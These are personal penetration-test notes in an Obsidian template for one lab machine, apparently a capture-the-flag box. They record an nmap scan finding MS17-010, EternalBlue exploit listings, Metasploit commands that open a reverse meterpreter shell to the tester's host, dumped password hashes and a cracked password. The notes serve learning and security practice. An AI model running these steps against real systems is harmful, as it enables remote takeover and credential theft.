Use this template in Obsidian to register your findings per target.

---
## 🖥️ Target System: `IP/Hostname`


<summary>1. 🧭 Initial Reconnaissance</summary>

- **Tools Used**: nmap
- **Host Discovery**:
  - Was the host alive? - Yes
  - Ping Response:

![[Pasted image 20250628121808.png]]

- **Port Scan Results**:
  - Open Ports:
  - Service Versions:
  - OS Detection:

![[initial_recon.txt]]
---

<summary>2. 📂 Enumeration</summary>

- **Ports/Services Analyzed**: 
- **Tools Used**:
- **Findings**:
  - Directories found:
  - Enumerated users/accounts:
  - Software versions:
- **Screenshots/Proof**:

![[Pasted image 20250628130257.png]]

---

<summary>3. 🚨 Vulnerability Analysis</summary>

- **Identified Vulnerabilities**:
  - Description: Used --script vuln to find common vulnerabilities on open ports and then use searchsploit to explore vulnerabilities found
  - CVE/Exploit DB Ref:
- **Tool(s) Used**: nmap, searchsploit
- **Proof/Output**:
  - Command results, error messages, etc.

```
sudo nmap -Pn -sV -T5 -v3 --script vuln 10.10.131.86 -o vulnerabilities.txt
```

![[vulnerabilities.txt]]

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

$searchsploit ms17-010
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execut | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                  | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)               | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS1 | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)     | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)  | windows_x86-64/remote/41987.py

---

<summary>4. 💣 Exploitation</summary>

- **Tool(s) Used**: Metasploit
- **Exploit/Payload**:
	- SMB Remote Code Execution Scanner (MS17-010) (Metasploit) - windows/dos/41891.rb
  - Command:
	- search ms17-010
	- use 0
	- ![[Pasted image 20250628123547.png]]
	- options
	- set rhosts 10.10.131.86
	- set LHOST 10.14.102.108
	- run

- **Result**:
  - Got Shell? User Access? 
	  - yes a meterpreter session
	  - NT AUTHORITY\SYSTEMNT AUTHORITY\SYSTEM using getuid
- **Post-Exploitation Notes**:
  - E.g., accessed user.txt
- **Proof**:

![[Pasted image 20250628123950.png]]

![[Pasted image 20250628124117.png]]

---

<summary>5. 🪜 Privilege Escalation</summary>

- **Initial Access Level**: NT AUTHORITY\SYSTEM
- **Techniques Tried**:
  - NA - already have full access to machine
- **Success Path**:
  - Commands used:
- **Root Access?** (Yes)

---

<summary>6. 🗃️ Post-Exploitation</summary>

- **Files/Flags Accessed**:
- **Sensitive Data Found**:
  - **Passwords, config files:
	  - using hashdump:
	  
		- Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
		- Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
		- Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

- **Users Compromised (User:pass)**:
	- used CrackStation
		- Jon: alqfna22

---

<summary>7. 📓 Lessons Learned</summary>

- **What Worked**: meterpreter exploitaion, nmap, searchsploit

---

